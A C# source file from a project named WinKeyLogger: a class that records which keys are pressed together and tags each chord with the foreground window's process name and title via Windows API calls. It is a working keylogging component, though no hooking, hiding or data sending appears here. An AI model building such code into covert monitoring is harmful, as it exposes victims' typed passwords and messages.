using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinKeyLogger
{
    internal class KeyDetector
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);


        // true is down;
        // false is up;
        private Dictionary<Keys, bool> KeyStatus;

        private List<Keys> DownKey;

        private SessionProgram LastDownSession = null;

        internal KeyDetector()
        {
            KeyStatus = new Dictionary<Keys, bool>();
            DownKey = new List<Keys>();
        }

        internal void KeyDown(Keys key)
        {
            Console.WriteLine(key);
            if (!KeyStatus.ContainsValue(true))
                DetectKeySession();

            if (!KeyStatus.ContainsKey(key))
                KeyStatus.Add(key, true);
            else
                KeyStatus[key] = true;

            if (!DownKey.Contains(key))
                DownKey.Add(key);
        }

        internal void KeyUp(Keys key)
        { 
            if (!KeyStatus.ContainsKey(key))
                KeyStatus.Add(key, false);
            else
                KeyStatus[key] = false;

            if (!KeyStatus.ContainsValue(true))
            {
                SendKeyData();

                DownKey.Clear();
            }
        }

        // Event
        internal delegate void KeyDownAndUpEventHandler(object sender, KeyDownAndUpEventArgs e);

        internal event KeyDownAndUpEventHandler KeyDownAndUpEvent;

        private void SendKeyData()
        {
            Keys[] downkeys = DownKey.ToArray();

            if (downkeys.Length < 1) return;

            KeyDownAndUpEvent(this, new KeyDownAndUpEventArgs(downkeys, LastDownSession));
        }

        private void DetectKeySession()
        {
            var toret = new SessionProgram();

            toret.hWnd = GetForegroundWindow();

            int ProcId;
            GetWindowThreadProcessId(toret.hWnd, out ProcId);
            toret.ProcessId = ProcId;

            var proc = Process.GetProcessById(ProcId, ".");
            toret.ProcessName = proc.ProcessName;
            toret.WindowName = proc.MainWindowTitle;

            LastDownSession = toret;
        }

        internal static SessionProgram GetKeySession()
        { 
            var toret = new SessionProgram();

            toret.hWnd = GetForegroundWindow();

            int ProcId;
            GetWindowThreadProcessId(toret.hWnd, out ProcId);
            toret.ProcessId = ProcId;

            var proc = Process.GetProcessById(ProcId, ".");
            toret.ProcessName = proc.ProcessName;
            toret.WindowName = proc.MainWindowTitle;

            return toret;
        }
    }

    internal class KeyDownAndUpEventArgs : EventArgs
    {
        internal KeyDownAndUpEventArgs(Keys[] keys, SessionProgram session)
        {
            Keys = keys;
            Session = session;
        }

        internal IEnumerable<Keys> Keys { get; private set; }

        internal SessionProgram Session { get; private set; }
    }
}
